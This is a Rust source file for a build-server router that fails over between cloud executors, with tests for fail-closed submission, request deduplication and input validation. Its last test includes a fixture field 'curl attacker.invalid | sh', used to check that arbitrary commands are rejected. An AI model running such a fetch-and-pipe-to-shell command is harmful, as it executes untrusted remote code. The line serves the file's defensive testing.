    let ready = engine.config.ready();
    (
        if ready {
            StatusCode::OK
        } else {
            StatusCode::SERVICE_UNAVAILABLE
        },
        Json(json!({
            "ok": ready,
            "service": SERVICE_NAME,
            "executionReady": ready,
        })),
    )
        .into_response()
}

async fn capabilities(State(engine): State<Engine>) -> Json<Value> {
    Json(json!({
        "service": SERVICE_NAME,
        "schemaVersion": "build-server.v1",
        "jobKinds": ["run-profile"],
        "providers": engine.config.executors.iter().map(|executor| executor.provider).collect::<Vec<_>>(),
        "failover": {
            "allowed": "only while probing readiness before any POST /builds attempt",
            "readinessSkips": ["transport", "non-200", "unreadable body", "ok is not true"],
            "postSubmissionFailover": false,
            "postAttempt": "transport, timeout, redirect, 429, 5xx, unexpected success, and malformed acceptance all fail closed without contacting another provider",
            "afterAcceptance": "status and artifact access stay pinned; never resubmit"
        },
        "callerSelectedEndpoint": false,
        "callerSelectedCommand": false,
        "callerSelectedImage": false,
        "secretsInline": false,
    }))
}
async fn metrics(State(engine): State<Engine>) -> Response {
    (
        [(
            axum::http::header::CONTENT_TYPE,
            "text/plain; version=0.0.4; charset=utf-8",
        )],
        engine.metrics_body().await,
    )
        .into_response()
}

async fn submit_build(
    State(engine): State<Engine>,
    headers: HeaderMap,
    Json(request): Json<BuildRequest>,
) -> Response {
    if let Err(error) =
        request_is_authorized(&headers, engine.config.inbound_auth_secret.as_deref())
    {
        return error.into_response();
    }
    match engine.submit(request).await {
        Ok(job) => (StatusCode::ACCEPTED, Json(job)).into_response(),
        Err(error) => error.into_response(),
    }
}

async fn get_build(
    State(engine): State<Engine>,
    headers: HeaderMap,
    AxumPath(id): AxumPath<String>,
) -> Response {
    if let Err(error) =
        request_is_authorized(&headers, engine.config.inbound_auth_secret.as_deref())
    {
        return error.into_response();
    }
    match engine.poll(&id).await {
        Ok(job) => (StatusCode::OK, Json(job)).into_response(),
        Err(error) => error.into_response(),
    }
}

fn env_bool(name: &str, default: bool) -> Result<bool, String> {
    match env::var(name) {
        Ok(value) => match value.trim().to_ascii_lowercase().as_str() {
            "1" | "true" | "yes" | "on" => Ok(true),
            "0" | "false" | "no" | "off" => Ok(false),
            _ => Err(format!("{name} must be true or false")),
        },
        Err(_) => Ok(default),
    }
}

fn env_u16(name: &str, default: u16) -> Result<u16, String> {
    env::var(name)
        .ok()
        .map(|value| {
            value
                .parse::<u16>()
                .map_err(|error| format!("{name} is invalid: {error}"))
        })
        .transpose()
        .map(|value| value.unwrap_or(default))
}

fn env_u64(name: &str, default: u64) -> Result<u64, String> {
    env::var(name)
        .ok()
        .map(|value| {
            value
                .parse::<u64>()
                .map_err(|error| format!("{name} is invalid: {error}"))
        })
        .transpose()
        .map(|value| value.unwrap_or(default))
}

fn env_usize(name: &str, default: usize) -> Result<usize, String> {
    env::var(name)
        .ok()
        .map(|value| {
            value
                .parse::<usize>()
                .map_err(|error| format!("{name} is invalid: {error}"))
        })
        .transpose()
        .map(|value| value.unwrap_or(default))
}

#[cfg(test)]
mod tests {
    use super::*;
    use axum::{routing::get, routing::post};
    use std::sync::atomic::AtomicU64;
    use tokio::{net::TcpListener, time::sleep};

    #[derive(Clone)]
    struct DoubleState {
        ready_status: StatusCode,
        ready_body: Value,
        submit_status: StatusCode,
        poll_status: StatusCode,
        job_id: String,
        submit_body: Value,
        submit_delay: Duration,
        ready_count: Arc<AtomicU64>,
        submit_count: Arc<AtomicU64>,
        poll_count: Arc<AtomicU64>,
    }

    impl DoubleState {
        fn new(submit_status: StatusCode, poll_status: StatusCode, job_id: &str) -> Self {
            Self {
                ready_status: StatusCode::OK,
                ready_body: json!({ "ok": true }),
                submit_status,
                poll_status,
                job_id: job_id.to_string(),
                submit_body: json!({ "error": "upstream-secret-body-must-not-leak" }),
                submit_delay: Duration::ZERO,
                ready_count: Arc::new(AtomicU64::new(0)),
                submit_count: Arc::new(AtomicU64::new(0)),
                poll_count: Arc::new(AtomicU64::new(0)),
            }
        }
    }

    async fn double_ready(State(state): State<DoubleState>) -> Response {
        state.ready_count.fetch_add(1, Ordering::Relaxed);
        (state.ready_status, Json(state.ready_body)).into_response()
    }

    async fn double_submit(
        State(state): State<DoubleState>,
        headers: HeaderMap,
        Json(_request): Json<Value>,
    ) -> Response {
        state.submit_count.fetch_add(1, Ordering::Relaxed);
        if headers
            .get("x-build-server-auth")
            .and_then(|value| value.to_str().ok())
            != Some("executor-secret")
        {
            return StatusCode::UNAUTHORIZED.into_response();
        }
        if !state.submit_delay.is_zero() {
            sleep(state.submit_delay).await;
        }
        let body = if state.submit_status == StatusCode::ACCEPTED {
            json!({ "id": state.job_id, "status": "queued" })
        } else {
            state.submit_body.clone()
        };
        (state.submit_status, Json(body)).into_response()
    }

    async fn double_poll(
        State(state): State<DoubleState>,
        headers: HeaderMap,
        AxumPath(id): AxumPath<String>,
    ) -> Response {
        state.poll_count.fetch_add(1, Ordering::Relaxed);
        if headers
            .get("x-build-server-auth")
            .and_then(|value| value.to_str().ok())
            != Some("executor-secret")
        {
            return StatusCode::UNAUTHORIZED.into_response();
        }
        let body = if state.poll_status == StatusCode::OK {
            json!({ "id": id, "status": "succeeded" })
        } else {
            json!({ "error": "poll-body-must-not-leak" })
        };
        (state.poll_status, Json(body)).into_response()
    }

    async fn spawn_double(state: DoubleState) -> (String, DoubleState) {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let address = listener.local_addr().unwrap();
        let app = Router::new()
            .route("/readyz", get(double_ready))
            .route("/builds", post(double_submit))
            .route("/builds/:id", get(double_poll))
            .with_state(state.clone());
        tokio::spawn(async move {
            axum::serve(listener, app).await.unwrap();
        });
        (format!("http://{address}"), state)
    }

    fn executor(id: &str, provider: Provider, base_url: String) -> Executor {
        Executor {
            id: id.to_string(),
            provider,
            base_url,
            auth_secret_file: PathBuf::from(format!("/run/secrets/{id}")),
            auth_secret: Some("executor-secret".to_string()),
        }
    }

    fn config(executors: Vec<Executor>) -> Config {
        Config {
            host: "127.0.0.1".to_string(),
            port: 0,
            execution_enabled: true,
            max_routes: 64,
            max_response_bytes: 16 * 1024,
            request_timeout: Duration::from_secs(2),
            inbound_auth_secret_file: Some(PathBuf::from("/run/secrets/operator")),
            inbound_auth_secret: Some("operator-secret".to_string()),
            executors,
        }
    }

    fn request(id: &str) -> BuildRequest {
        BuildRequest {
            schema_version: "build-server.v1".to_string(),
            job_kind: "run-profile".to_string(),
            repo_url: "https://github.com/ORESoftware/k8s-cluster.git".to_string(),
            git_ref: "0123456789abcdef0123456789abcdef01234567".to_string(),
            profile: "rust-ci".to_string(),
            request_id: id.to_string(),
        }
    }

    #[tokio::test]
    async fn aws_accepts_without_contacting_hetzner() {
        let (aws_url, aws) = spawn_double(DoubleState::new(
            StatusCode::ACCEPTED,
            StatusCode::OK,
            "aws-job",
        ))
        .await;
        let (hetzner_url, hetzner) = spawn_double(DoubleState::new(
            StatusCode::ACCEPTED,
            StatusCode::OK,
            "hetzner-job",
        ))
        .await;
        let engine = Engine::new(config(vec![
            executor("aws", Provider::Aws, aws_url),
            executor("hetzner", Provider::Hetzner, hetzner_url),
        ]))
        .unwrap();

        let accepted = engine.submit(request("request-one")).await.unwrap();
        assert_eq!(accepted.id, "aws~aws-job");
        assert_eq!(aws.ready_count.load(Ordering::Relaxed), 1);
        assert_eq!(aws.submit_count.load(Ordering::Relaxed), 1);
        assert_eq!(hetzner.ready_count.load(Ordering::Relaxed), 0);
        assert_eq!(hetzner.submit_count.load(Ordering::Relaxed), 0);
    }

    #[tokio::test]
    async fn aws_500_after_post_is_ambiguous_and_never_falls_through() {
        let (aws_url, aws) = spawn_double(DoubleState::new(
            StatusCode::INTERNAL_SERVER_ERROR,
            StatusCode::OK,
            "aws-job",
        ))
        .await;
        let (hetzner_url, hetzner) = spawn_double(DoubleState::new(
            StatusCode::ACCEPTED,
            StatusCode::OK,
            "hetzner-job",
        ))
        .await;
        let engine = Engine::new(config(vec![
            executor("aws", Provider::Aws, aws_url),
            executor("hetzner", Provider::Hetzner, hetzner_url),
        ]))
        .unwrap();

        let error = engine.submit(request("request-two")).await.unwrap_err();
        assert_eq!(error.code, "submission_outcome_ambiguous");
        assert_eq!(aws.ready_count.load(Ordering::Relaxed), 1);
        assert_eq!(aws.submit_count.load(Ordering::Relaxed), 1);
        assert_eq!(hetzner.ready_count.load(Ordering::Relaxed), 0);
        assert_eq!(hetzner.submit_count.load(Ordering::Relaxed), 0);
    }

    #[tokio::test]
    async fn aws_429_after_post_is_ambiguous_and_never_falls_through() {
        let (aws_url, aws) = spawn_double(DoubleState::new(
            StatusCode::TOO_MANY_REQUESTS,
            StatusCode::OK,
            "aws-job",
        ))
        .await;
        let (hetzner_url, hetzner) = spawn_double(DoubleState::new(
            StatusCode::ACCEPTED,
            StatusCode::OK,
            "hetzner-job",
        ))
        .await;
        let engine = Engine::new(config(vec![
            executor("aws", Provider::Aws, aws_url),
            executor("hetzner", Provider::Hetzner, hetzner_url),
        ]))
        .unwrap();

        let error = engine.submit(request("request-three")).await.unwrap_err();
        assert_eq!(error.code, "submission_outcome_ambiguous");
        assert_eq!(aws.ready_count.load(Ordering::Relaxed), 1);
        assert_eq!(aws.submit_count.load(Ordering::Relaxed), 1);
        assert_eq!(hetzner.ready_count.load(Ordering::Relaxed), 0);
        assert_eq!(hetzner.submit_count.load(Ordering::Relaxed), 0);
    }

    #[tokio::test]
    async fn readiness_failure_selects_hetzner_before_any_aws_submission() {
        let mut aws_state = DoubleState::new(StatusCode::ACCEPTED, StatusCode::OK, "aws-job");
        aws_state.ready_status = StatusCode::SERVICE_UNAVAILABLE;
        aws_state.ready_body = json!({ "ok": false });
        let (aws_url, aws) = spawn_double(aws_state).await;
        let (hetzner_url, hetzner) = spawn_double(DoubleState::new(
            StatusCode::ACCEPTED,
            StatusCode::OK,
            "hetzner-job",
        ))
        .await;
        let engine = Engine::new(config(vec![
            executor("aws", Provider::Aws, aws_url),
            executor("hetzner", Provider::Hetzner, hetzner_url),
        ]))
        .unwrap();

        let accepted = engine.submit(request("request-four")).await.unwrap();
        assert_eq!(accepted.id, "hetzner~hetzner-job");
        assert_eq!(aws.ready_count.load(Ordering::Relaxed), 1);
        assert_eq!(aws.submit_count.load(Ordering::Relaxed), 0);
        assert_eq!(hetzner.ready_count.load(Ordering::Relaxed), 1);
        assert_eq!(hetzner.submit_count.load(Ordering::Relaxed), 1);
    }

    #[tokio::test]
    async fn post_timeout_after_readiness_is_ambiguous_and_never_falls_through() {
        let mut aws_state = DoubleState::new(StatusCode::ACCEPTED, StatusCode::OK, "aws-job");
        aws_state.submit_delay = Duration::from_millis(250);
        let (aws_url, aws) = spawn_double(aws_state).await;
        let (hetzner_url, hetzner) = spawn_double(DoubleState::new(
            StatusCode::ACCEPTED,
            StatusCode::OK,
            "hetzner-job",
        ))
        .await;
        let mut router_config = config(vec![
            executor("aws", Provider::Aws, aws_url),
            executor("hetzner", Provider::Hetzner, hetzner_url),
        ]);
        router_config.request_timeout = Duration::from_millis(50);
        let engine = Engine::new(router_config).unwrap();

        let error = engine.submit(request("request-timeout")).await.unwrap_err();
        assert_eq!(error.code, "submission_outcome_ambiguous");
        assert_eq!(aws.ready_count.load(Ordering::Relaxed), 1);
        assert_eq!(aws.submit_count.load(Ordering::Relaxed), 1);
        assert_eq!(hetzner.ready_count.load(Ordering::Relaxed), 0);
        assert_eq!(hetzner.submit_count.load(Ordering::Relaxed), 0);
    }

    #[tokio::test]
    async fn aws_4xx_fails_closed_without_hetzner_fallback_or_body_leak() {
        let (aws_url, aws) = spawn_double(DoubleState::new(
            StatusCode::BAD_REQUEST,
            StatusCode::OK,
            "aws-job",
        ))
        .await;
        let (hetzner_url, hetzner) = spawn_double(DoubleState::new(
            StatusCode::ACCEPTED,
            StatusCode::OK,
            "hetzner-job",
        ))
        .await;
        let engine = Engine::new(config(vec![
            executor("aws", Provider::Aws, aws_url),
            executor("hetzner", Provider::Hetzner, hetzner_url),
        ]))
        .unwrap();

        let error = engine.submit(request("request-five")).await.unwrap_err();
        assert_eq!(error.code, "upstream_contract_rejected");
        assert!(!error.message.contains("upstream-secret-body"));
        assert_eq!(aws.ready_count.load(Ordering::Relaxed), 1);
        assert_eq!(aws.submit_count.load(Ordering::Relaxed), 1);
        assert_eq!(hetzner.ready_count.load(Ordering::Relaxed), 0);
        assert_eq!(hetzner.submit_count.load(Ordering::Relaxed), 0);
    }

    #[tokio::test]
    async fn duplicate_request_id_is_submitted_once_even_when_concurrent() {
        let mut state = DoubleState::new(StatusCode::ACCEPTED, StatusCode::OK, "aws-job");
        state.submit_delay = Duration::from_millis(100);
        let (aws_url, aws) = spawn_double(state).await;
        let engine = Engine::new(config(vec![executor("aws", Provider::Aws, aws_url)])).unwrap();
        let first_engine = engine.clone();
        let second_engine = engine.clone();
        let first =
            tokio::spawn(
                async move { first_engine.submit(request("same-request")).await.unwrap() },
            );
        let second =
            tokio::spawn(
                async move { second_engine.submit(request("same-request")).await.unwrap() },
            );

        let first = first.await.unwrap();
        let second = second.await.unwrap();
        assert_eq!(first.id, second.id);
        assert_eq!(aws.submit_count.load(Ordering::Relaxed), 1);

        let third = engine.submit(request("same-request")).await.unwrap();
        assert_eq!(third.id, first.id);
        assert_eq!(aws.submit_count.load(Ordering::Relaxed), 1);
    }

    #[tokio::test]
    async fn accepted_aws_poll_failure_stays_pinned_and_never_resubmits() {
        let (aws_url, aws) = spawn_double(DoubleState::new(
            StatusCode::ACCEPTED,
            StatusCode::INTERNAL_SERVER_ERROR,
            "aws-job",
        ))
        .await;
        let (hetzner_url, hetzner) = spawn_double(DoubleState::new(
            StatusCode::ACCEPTED,
            StatusCode::OK,
            "hetzner-job",
        ))
        .await;
        let engine = Engine::new(config(vec![
            executor("aws", Provider::Aws, aws_url),
            executor("hetzner", Provider::Hetzner, hetzner_url),
        ]))
        .unwrap();

        let accepted = engine.submit(request("pinned-request")).await.unwrap();
        let error = engine.poll(&accepted.id).await.unwrap_err();
        assert_eq!(error.code, "pinned_executor_poll_failed");
        assert!(!error.message.contains("poll-body"));
        assert_eq!(aws.submit_count.load(Ordering::Relaxed), 1);
        assert_eq!(aws.poll_count.load(Ordering::Relaxed), 1);
        assert_eq!(hetzner.submit_count.load(Ordering::Relaxed), 0);
        assert_eq!(hetzner.poll_count.load(Ordering::Relaxed), 0);
    }

    #[tokio::test]
    async fn polling_rewrites_the_upstream_id_with_executor_namespace() {
        let (aws_url, aws) = spawn_double(DoubleState::new(
            StatusCode::ACCEPTED,
            StatusCode::OK,
            "aws-job",
        ))
        .await;
        let engine = Engine::new(config(vec![executor("aws", Provider::Aws, aws_url)])).unwrap();

        let accepted = engine.submit(request("poll-request")).await.unwrap();
        let terminal = engine.poll(&accepted.id).await.unwrap();
        assert_eq!(terminal.id, "aws~aws-job");
        assert_eq!(terminal.status, "succeeded");
        assert_eq!(
            terminal.fields.get("provider"),
            Some(&Value::String("aws".to_string()))
        );
        assert_eq!(aws.poll_count.load(Ordering::Relaxed), 1);
    }

    #[test]
    fn endpoint_validation_rejects_credentials_paths_and_public_http() {
        for invalid in [
            "https://user:pass@example.com",
            "https://example.com/build-server",
            "https://example.com?token=x",
            "https://example.com#fragment",
            "http://example.com",
            "ftp://example.com",
        ] {
            assert!(validate_base_url(invalid).is_err(), "{invalid} must fail");
        }
        assert!(validate_base_url("http://127.0.0.1:8120").is_ok());
        assert!(validate_base_url("http://dd-build-server.dd.svc:8120").is_ok());
        assert!(validate_base_url("https://builds.example.com").is_ok());
    }

    #[test]
    fn executor_configuration_rejects_duplicate_authorities() {
        let duplicate_provider = vec![
            executor(
                "aws-a",
                Provider::Aws,
                "https://aws-a.example.com".to_string(),
            ),
            executor(
                "aws-b",
                Provider::Aws,
                "https://aws-b.example.com".to_string(),
            ),
        ];
        assert!(validate_executor_set(&duplicate_provider).is_err());

        let mut duplicate_secret = vec![
            executor("aws", Provider::Aws, "https://aws.example.com".to_string()),
            executor(
                "hetzner",
                Provider::Hetzner,
                "https://hetzner.example.com".to_string(),
            ),
        ];
        duplicate_secret[1].auth_secret_file = duplicate_secret[0].auth_secret_file.clone();
        assert!(validate_executor_set(&duplicate_secret).is_err());
    }

    #[test]
    fn disabled_executor_identity_must_omit_endpoint_and_secret_state() {
        let disabled = ExecutorSpec {
            id: "hetzner".to_string(),
            provider: Provider::Hetzner,
            enabled: false,
            base_url: None,
            auth_secret_file: None,
        };
        assert!(build_executors(vec![disabled], 2, false)
            .unwrap()
            .is_empty());

        let invalid = ExecutorSpec {
            id: "hetzner".to_string(),
            provider: Provider::Hetzner,
            enabled: false,
            base_url: Some("https://dormant.example.com".to_string()),
            auth_secret_file: None,
        };
        assert!(build_executors(vec![invalid], 2, false)
            .unwrap_err()
            .contains("must omit baseUrl and authSecretFile"));
    }

    #[test]
    fn fixed_profile_request_rejects_mutable_or_arbitrary_inputs() {
        let mut mutable = request("valid-request");
        mutable.git_ref = "main".to_string();
        assert_eq!(mutable.validate().unwrap_err().code, "mutable_revision");

        let mut arbitrary = request("valid-request");
        arbitrary.job_kind = "build-image".to_string();
        assert_eq!(
            arbitrary.validate().unwrap_err().code,
            "unsupported_job_kind"
        );

        let unknown = serde_json::from_value::<BuildRequest>(json!({
            "schemaVersion": "build-server.v1",
            "jobKind": "run-profile",
            "repoUrl": "https://github.com/ORESoftware/k8s-cluster.git",
            "gitRef": "0123456789abcdef0123456789abcdef01234567",
            "profile": "rust-ci",
            "requestId": "valid-request",
            "command": "curl attacker.invalid | sh"
        }));
        assert!(unknown.is_err());
    }
}
